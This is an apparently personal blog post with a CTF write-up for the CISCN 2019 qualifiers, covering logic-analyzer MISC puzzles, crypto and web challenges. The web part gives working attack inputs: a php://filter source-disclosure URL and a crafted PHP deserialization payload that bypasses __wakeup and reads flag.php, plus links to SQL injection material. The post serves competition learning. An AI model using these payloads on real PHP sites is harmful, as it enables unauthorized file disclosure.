@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m09ic.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="比赛过去已经比较久了,拖延症一直懒得写wp. 去年也参加过ciscn,基本上只解了个签到题就进了线下(丢人) 今年稍微好一点,但是参数队伍明显多了,还好线下赛也扩容了. 确确实实,真真切切的意识到自己和大佬们的差距,不仅仅是比赛经验带来了,还有思维方式以及学习能力的差距.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN 2019 Quals Writeup(补档)">
+<meta property="og:url" content="https://m09ic.top/posts/41838/index.html">
+<meta property="og:site_name" content="M09ic&#39;s Blog">
+<meta property="og:description" content="比赛过去已经比较久了,拖延症一直懒得写wp. 去年也参加过ciscn,基本上只解了个签到题就进了线下(丢人) 今年稍微好一点,但是参数队伍明显多了,还好线下赛也扩容了. 确确实实,真真切切的意识到自己和大佬们的差距,不仅仅是比赛经验带来了,还有思维方式以及学习能力的差距.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://m09ic.top/posts/41838/1.png">
+<meta property="og:image" content="https://m09ic.top/posts/41838/2.png">
+<meta property="og:image" content="https://m09ic.top/posts/41838/3.png">
+<meta property="og:image" content="https://m09ic.top/posts/41838/4.png">
+<meta property="og:image" content="https://m09ic.top/posts/41838/5.png">
+<meta property="og:image" content="https://m09ic.top/posts/41838/6.png">
+<meta property="article:published_time" content="2019-06-03T12:42:16.000Z">
+<meta property="article:modified_time" content="2021-01-04T14:52:09.870Z">
+<meta property="article:author" content="M09ic">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://m09ic.top/posts/41838/1.png">
+
+<link rel="canonical" href="https://m09ic.top/posts/41838/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CISCN 2019 Quals Writeup(补档) | M09ic's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140303637-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-140303637-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?04d80448a6c7bfee29f2e7379ff56865";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="M09ic's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M09ic's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">独自行走于莽荒之地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/41838/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN 2019 Quals Writeup(补档)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-06-03 20:42:16" itemprop="dateCreated datePublished" datetime="2019-06-03T20:42:16+08:00">2019-06-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:09" itemprop="dateModified" datetime="2021-01-04T22:52:09+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-AWD/" itemprop="url" rel="index"><span itemprop="name">CTF&AWD</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/41838/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/41838/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>比赛过去已经比较久了,拖延症一直懒得写wp.</p>
+<p>去年也参加过ciscn,基本上只解了个签到题就进了线下(丢人)</p>
+<p>今年稍微好一点,但是参数队伍明显多了,还好线下赛也扩容了.</p>
+<p>确确实实,真真切切的意识到自己和大佬们的差距,不仅仅是比赛经验带来了,还有思维方式以及学习能力的差距.</p>
+<a id="more"></a>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 签到题"></a>0x00 签到题</h3><p>打开软件自己就给flag了.</p>
+<p> 三个圆圈也行?</p>
+<p>flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d}</p>
+<h3 id="0x01-saleae"><a href="#0x01-saleae" class="headerlink" title="0x01 saleae"></a>0x01 saleae</h3><p>拿到附件,看到<code>.logicdata</code>后缀,随便google一下</p>
+<p><img src="1.png" alt="1"></p>
+<p>找到一个叫saleae工具,这不就是题目名称么…</p>
+<p>完全没接触过数电方面的东西.下载安装好用saleae打开<code>.logicdata</code>文件</p>
+<p><img src="2.png" alt="2"></p>
+<p>搜了一下saleae的基本操作,导出csv格式的文件.</p>
+<p><img src="3.png" alt="3"></p>
+<p>第一列01交替,第三列0和1随机,写了个脚本取将第三列的数据直接转ascii.</p>
+<p>不太对,但是得到<code>flag&#123;</code>这个字符串了,后面是乱码.</p>
+<p>继续翻google,看各种文档.大概知道了这个叫串行同步传输协议.</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b0c5810a79ef">https://www.jianshu.com/p/b0c5810a79ef</a></p>
+<p>8位bit一组,当电位改变时传输一位bit.</p>
+<p>稍微改下脚本,得到:</p>
+<p><code>01100110011011000110000101100111011110110011000100110010001 10000001101110011000100110011001110010011011100101101001100 01001110010110010000110001001011010011010000111000011001010 01001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110110110001011010110001001100101001110000110001100101101001101110011100000110100011100111000001101000110001000111000001110010110000100111000110001000111000001110010110000100111001001101010110010100110000001101110111110100110101011001010011000000110111011111011</code></p>
+<p>转ascii码</p>
+<p><img src="4.png" alt="4"></p>
+<p><code>flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</code></p>
+<h3 id="0x02-24c"><a href="#0x02-24c" class="headerlink" title="0x02 24c"></a>0x02 24c</h3><p>第二天的比赛还有进阶的题目.</p>
+<p>对数电一无所知,直接把题目复制到google,就看到L2C关键字,又看到saleae里面见过.</p>
+<p>所以用saleae打开附件,选择L2C协议解析.</p>
+<p><img src="5.png" alt="5"></p>
+<p>一眼就看到flag(对flag总是特别敏感)</p>
+<p>导出为csv.把flag拼接一下</p>
+<p><img src="6.png" alt="6"></p>
+<p>(完整的截图找不到了..)</p>
+<p><code> f163bdf4e&#125;flag&#123;c46d9e10-e9b5-4d90-a883-41c\ac</code></p>
+<p>明显不对,google翻L2C协议</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/31086959">https://zhuanlan.zhihu.com/p/31086959</a></p>
+<p>大致意思就是读flag的一个过程,中间有几次write操作.</p>
+<p>write操作传输的第一个Byte表示写入位置.</p>
+<p>改好flag即可.</p>
+<p><code>flag&#123;c46dac10-e9b5-4d90-a883-41cf163bdf4e&#125;</code></p>
+<h3 id="0x03-usbasp"><a href="#0x03-usbasp" class="headerlink" title="0x03 usbasp"></a>0x03 usbasp</h3><p>文件格式还一样的.google也没搜到有用的结果.反正saleae里面就这么几个协议,一个一个事.</p>
+<p>很快就试到有意义的字符串.</p>
+<p>翻到最后找到flag</p>
+<p><code>flag&#123;85b084c6-42e6-495c-87b4-46dfb1df58a0&#125;</code></p>
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x04-justsoso"><a href="#0x04-justsoso" class="headerlink" title="0x04 justsoso"></a>0x04 justsoso</h3><p>各种计算器+现实找人+百度解的.</p>
+<p><code>flag&#123;01924dd7-1e14-48d0-9d80fa6bed9c7a00&#125;0</code></p>
+<h3 id="0x05-warmup"><a href="#0x05-warmup" class="headerlink" title="0x05 warmup"></a>0x05 warmup</h3><p>总感觉这种题做过好几次了,和去年的DDCTF里的一题基本一样.</p>
+<p>可以控制填充字符串的长度,直接一位一位爆破出来.</p>
+<p>(脚本稍后附上)</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="0x06-JustSoso"><a href="#0x06-JustSoso" class="headerlink" title="0x06 JustSoso"></a>0x06 JustSoso</h3><p>伪协议读源码,根据Hint先读<code>hint.php</code>的</p>
+<p><code>/?file=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>顺便读一下<code>index.php</code>的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">    &lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>很明显的PHP反序列化的题目,审源码尝试构造反序列化字符串.</p>
+<p>逻辑比较清晰,构造一个反序列化字符串,使得在<code>__destruct</code>时调用<code>Flag</code>类中<code>getflag</code>函数,期间要绕过各种判断.</p>
+<p>那么一个一个找办法绕.</p>
+<ol>
+<li><p>第一个就是<code>__weakup</code>时会把变量置为<code>null</code>,以<code>php 反序列化 __weakup</code>为关键字搜索,很快就找到不少文章.</p>
+<p>php反序列化绕过 __weakup](<a target="_blank" rel="noopener" href="https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/">https://mochazz.github.io/2018/12/30/PHP反序列化bug/</a>)</p>
+</li>
+</ol>
+<blockquote>
+<p>这个 <strong>bug</strong> 的原理是：当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 <strong>__wakeup</strong> 函数的执行。</p>
+</blockquote>
+<ol start="2">
+<li><p><code>$handle</code>是私有变量,以<code>php 反序列化 私有变量</code>为关键字搜索.</p>
+<p> <a target="_blank" rel="noopener" href="https://mntn0x.github.io/2018/03/12/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">PHP序列化和反序列化基础</a></p>
+</li>
+</ol>
+<blockquote>
+<p>在DemoPoc 中，<strong>mntn data</strong> 占了10个长度，是因为序列化时：对象私有化成员会自动添加了类名，以区分他们是Private 变量；如果是Protected 变量则会添加* 号。并且前缀添加空字节</p>
+</blockquote>
+<ol start="3">
+<li><p><code>flag</code>关键字不能出现, 以<code>php parse_url 漏洞</code>为关键字搜索</p>
+<p><a target="_blank" rel="noopener" href="http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html">谈谈parse_url</a></p>
+</li>
+</ol>
+<p>加几个斜杠,成功绕过.</p>
+<ol start="4">
+<li><p>绕过md5比较.这里有两种方法,一种是直接碰撞,另外一种就是<code>引用</code>,使token变为token_flag的引用.</p>
+<p>最终payload:</p>
+</li>
+</ol>
+<p><code>///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handl e%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;c4ca 4238a0b923820dcc509a6f75849b&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</code></p>
+<p><code>flag&#123;570a8aea-e399-4e02-be6f-9496a70d6cb7&#125;</code></p>
+<h3 id="0x07-全宇宙最简单的SQL"><a href="#0x07-全宇宙最简单的SQL" class="headerlink" title="0x07 全宇宙最简单的SQL"></a>0x07 全宇宙最简单的SQL</h3><p>确实很简单,但是比赛的时候没做出来,深深的认识到了自己的不足.</p>
+<p>看到wp的时候,环境已经关了,也没有截图了.</p>
+<p>先拿常用的sql关键字的字典爆破一下,看看哪些东西被过滤了.</p>
+<p>顺便手测了一下,基本确定是个盲注.当最终拼接语句无错误时无论结果如何均为 <code>登录失败</code>.<br>当最终语句有错时返回为 <code>数据库操作失败</code>.</p>
+<p>在网上看到两种解法.</p>
+<ol>
+<li><p>时间盲注.</p>
+<p>直接贴大佬的链接了<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4906#toc-7">ROIS</a>和<a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/05/06/2019ciscn/#%E5%85%A8%E5%AE%87%E5%AE%99%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84SQL">Zedd</a>,两位大佬用的方式稍微有不同</p>
+</li>
+<li><p>布尔盲注</p>
+<p>还是贴链接吧,<a target="_blank" rel="noopener" href="https://www.ctfwp.com/articals/2019national.html#%E5%85%A8%E5%AE%87%E5%AE%99%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84sql">ctfwp.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/04/22/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/">Mochazz</a>,这位大佬用的方法和我差不多,但是我在中间出了点小问题,卡住了.通过<code>and</code>短路来使<code>pow(9999,100)</code>报错</p>
+</li>
+</ol>
+<p>接下来就是mysql蜜罐读文件了,刚前两天的DDCTF2019就出来过,又来了,但是我根本就没做到这里(捂脸)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<p>github上有个工具.</p>
+<h3 id="0x08-love-math"><a href="#0x08-love-math" class="headerlink" title="0x08 love_math"></a>0x08 love_math</h3><p>这题我也没做出来,也是卡在中间某一步,痛苦~</p>
+<p>右键源代码可以看到一个可用函数的白名单,基本都是<code>math</code>库里的.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span 